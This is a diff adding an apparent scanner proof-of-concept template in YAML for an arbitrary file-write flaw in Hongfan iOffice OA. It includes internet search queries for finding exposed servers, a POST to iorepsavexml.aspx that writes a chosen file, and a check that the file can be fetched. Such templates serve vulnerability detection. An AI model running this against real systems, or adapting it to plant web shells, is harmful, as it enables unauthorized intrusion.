@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-hongfan-ioffice-iorepsavexml.aspx-upload
+transport: http
+set:
+  s1: randomInt(1000000000, 9000000000)
+  s2: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename={{s2}}.txt&filepath=/upfiles/rep/pic/
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: |
+              {{s1}}
+        expression: response.status == 200 && response.body_string.contains("HEAD1")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /iOffice/upfiles/rep/pic/{{s2}}.txt
+            headers:
+            body: 
+        expression: response.status == 200 && response.body_string.contains(string(s1))
+
+expression: r0() && r1()
